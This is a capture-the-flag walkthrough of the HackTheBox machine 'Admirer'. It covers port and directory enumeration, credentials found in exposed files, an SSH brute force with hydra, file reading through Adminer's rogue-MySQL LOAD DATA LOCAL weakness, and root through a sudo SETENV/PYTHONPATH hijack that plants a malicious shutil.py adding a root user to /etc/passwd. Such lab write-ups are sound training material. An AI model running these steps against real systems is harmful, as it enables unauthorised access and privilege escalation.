---
title: "HTB: Admirer"
categories:
  - HackTheBox
tags:
  - HackTheBox
---

![Admirer](https://i.ibb.co/VLR5T4P/Admirer.png)

# Admirer

## Nmap Scan

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 07:48 CDT          
Warning: 10.10.10.187 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.187          
Host is up (0.039s latency).                              
Not shown: 51173 closed ports, 14359 filtered ports
PORT   STATE SERVICE                                                                                                 
21/tcp open  ftp                                          
22/tcp open  ssh                                                                                                     
80/tcp open  http                                         

Nmap done: 1 IP address (1 host up) scanned in 16.49 seconds
```

## Website Enumeration

At http://10.10.10.187/robots.txt we see the following message:

```
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```

Looks interesting! We'll fuzz this directory:

```
gobuster dir -u http://10.10.10.187/admin-dir/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -s '200,204,301,302,307,403,500' -e -k -x "txt,html,php,xml,conf,pdf"

http://10.10.10.187/admin-dir/contacts.txt (Status: 200)
http://10.10.10.187/admin-dir/credentials.txt (Status: 200)
```

At http://10.10.10.187/admin-dir/contacts.txt we get the following emails/names:

```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

At http://10.10.10.187/admin-dir/credentials.txt we get credentials for a mail account, ftp account, and workpress account:

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

The most easily accessible account is the FTP account, so we'll connect using the credentials provided above. We get two files:

```
dump.sql
html.tar.gz
```

If we unzip the html.tar.gz file, we find some interesting stuff:

```
tar -xvzf html.tar.gz

cat utility-scripts/db_admin.php

  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";
```

These look like mysql credentials, since they're in a db_admin file.

```
cat w4ld0s_s3cr3t_d1r/credentials.txt

[Bank Account]
waldo.11
Ezy]m27}OREc$
```

We also have a Bank Account here, which could easily have been reused elsewhere on the machine.

We have another interesting script:

```
cat utility-scripts/admin_tasks.php

...
if(isset($_REQUEST['task']))
  {
    $task = $_REQUEST['task'];
    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
       $task == '5' || $task == '6' || $task == '7')
    {
      /*********************************************************************************** 
         Available options:
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)

           NOTE: Options 4-7 are currently NOT working because they need root privileges.
                 I'm leaving them in the valid tasks in case I figure out a way
                 to securely run code as root from a PHP page.
      ************************************************************************************/
      echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));
...
```

Visiting the website and appending ?task= will let us run some of these commands:

http://10.10.10.187/utility-scripts/admin_tasks.php?task=1

```
up 8 minutes
```

http://10.10.10.187/utility-scripts/admin_tasks.php?task=2

```
14:34:50 up 9 min, 0 users, load average: 0.02, 0.07, 0.03
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
```

http://10.10.10.187/utility-scripts/admin_tasks.php?task=3

```
no crontab for www-data
```

4-7 all give us the same error:

```
Insufficient privileges to perform the selected operation.
```

We get another password from index.php (from the archive we extracted):

```
                        $servername = "localhost";                                                                   
                        $username = "waldo";                                                             
                        $password = "]F7jLHw:*G>UPrTo}~A"d6b";                                
                        $dbname = "admirerdb";   
```



We can see what's in the SQL dump file:

```
sudo su
mysql -u root
create database pac default character set utf8 default collate utf8_bin;
exit
mysql -u root pac < dump.sql
mysql -u root
use pac;

show tables;
+---------------+
| Tables_in_pac |
+---------------+
| items         |
+---------------+

select * from items;

+----+-------------------------------+-------------------------+------------------------------+---------------------------------------------------------------------------------+
| id | thumb_path                    | image_path              | title                        | text                                                                            |
+----+-------------------------------+-------------------------+------------------------------+---------------------------------------------------------------------------------+
|  1 | images/thumbs/thmb_art01.jpg  | images/fulls/art01.jpg  | Visual Art                   | A pure showcase of skill and emotion.                                           |
|  2 | images/thumbs/thmb_eng02.jpg  | images/fulls/eng02.jpg  | The Beauty and the Beast     | Besides the technology, there is also the eye candy...                          |
|  3 | images/thumbs/thmb_nat01.jpg  | images/fulls/nat01.jpg  | The uncontrollable lightshow | When the sun decides to play at night.                                          |
|  4 | images/thumbs/thmb_arch02.jpg | images/fulls/arch02.jpg | Nearly Monochromatic         | One could simply spend hours looking at this indoor square.                     |
|  5 | images/thumbs/thmb_mind01.jpg | images/fulls/mind01.jpg | Way ahead of his time        | You probably still use some of his inventions... 500yrs later.                  |
|  6 | images/thumbs/thmb_mus02.jpg  | images/fulls/mus02.jpg  | The outcomes of complexity   | Seriously, listen to Dust in Interstellar's OST. Thank me later.                |
|  7 | images/thumbs/thmb_arch01.jpg | images/fulls/arch01.jpg | Back to basics               | And centuries later, we want to go back and live in nature... Sort of.          |
|  8 | images/thumbs/thmb_mind02.jpg | images/fulls/mind02.jpg | We need him back             | He might have been a loner who allegedly slept with a pigeon, but that brain... |
|  9 | images/thumbs/thmb_eng01.jpg  | images/fulls/eng01.jpg  | In the name of Science       | Some theories need to be proven.                                                |
| 10 | images/thumbs/thmb_mus01.jpg  | images/fulls/mus01.jpg  | Equal Temperament            | Because without him, music would not exist (as we know it today).               |
+----+-------------------------------+-------------------------+------------------------------+---------------------------------------------------------------------------------+
```

Looks like this is just the images, paths and descriptions. It is interesting though, as these don't really need to be in a database, so it appears that the images are being pulled to the website from the database somehow.

Since we don't have a good foothold through the website, we'll try using hydra to test all username/password combinations against ssh. We first need to make two lists (users.txt and passwords.txt) with all of the usernames and password we've gathered so far:

```
hydra -L users.txt -P passwords.txt 10.10.10.187 -t 4 ssh

ftpuser
%n?4Wz}R$tTF7
```

Looks like the ftpuser credentials work. However, whenever we try to open an ssh connection the the box, it instantly closes. To get around this, we can use a tunnel:

```
ssh -f ftpuser@admirer.htb -D 9050 -N
```

We can now run nmap with proxychains to scan the internal ports of the machine:

```
proxychains nmap 127.0.0.1

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

I tried using a python script to connect to MySQL over proxychains, but the credentials we have up to this point don't work. Based on the name of the machine, and the MySQL service running, we can infer that adminer is being used on this machine. We'll add adminer to a small wordlist (/usr/share/seclists/Discovery/Web-Content/common.txt) along with our directories (/admin-dir and /utility-scripts) and run ffuf against the website.

We find that http://10.10.10.187/utility-scripts/adminer.php exists!

We don't have any valid credentials for this portal, but we can use a vulnerability disclosed for this version at https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool 

We'll first need to start our database and connect to it locally:

```
sudo service mysql start
sudo su
mysql -uroot
```

We now need to create a user to connect back with and give it permissions:

```
CREATE USER 'remote'@10.10.10.187 IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'remote'@'10.10.10.187';
FLUSH PRIVILEGES;
```

Now, we need to connect to this server from the adminer.php portal, and go to SQL command. Once we're at the prompt, we can enter the following, to see if the password in index.php has been updated. Replace 'items' with a valid table in your database:

```
LOAD DATA local infile '/var/www/html/index.php'
into table items
fields terminated by '\n'
```

Hit execute, and then run the following, replacing items with your chosen table:

```
select * from items
```

We see:

```
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
```

Looks like it has changed! Trying this with the "waldo" user allows us to connect over SSH!

**waldo:&<h5b~yK3F#{PaPB&dA}{H>**

If we run sudo -l, we can see that waldo can run the following command:

```
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Taking a look at that admin_tasks.sh file, we can see that option 6 calls backup.py. In backup.py, we see that make_archive is being imported from shutils. We can hijack this DLL to get root!

Additionally, the SETENV in the sudoers file allows us to pass a new PYTHONPATH environment variable to the sudo command, making this even easier. We'll add the following script to /var/tmp to add a new user to /etc/passwd (which we'll want to clean up quickly after, so as to not ruin anyone else's experience with the machine):

NOTE: PYTHONPATH is an environment variable that tells Python to check a certain directory first, before checking default locations. 

shutil.py:

```
#!/bin/python3

import os

def make_archive(x, y, z):
        os.system('echo firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash >> /etc/passwd')
```

Now, we just need to run the sudo command, passing a new PYTHONPATH environment variable to it:

```
sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh

Choose Option 6
```

Now, we can su to firefart, giving ourselves root!

```
su firefart
Password: firefart

root@admirer:/var/tmp# whoami
root
```

Voila, root!

Note: It's usually better to return a reverse shell, so we don't have to modify /etc/passwd, but I had some issues with the box returning a stable shell. Now we just need to clean up after ourselves and delete the last line from /etc/passwd that we appended!

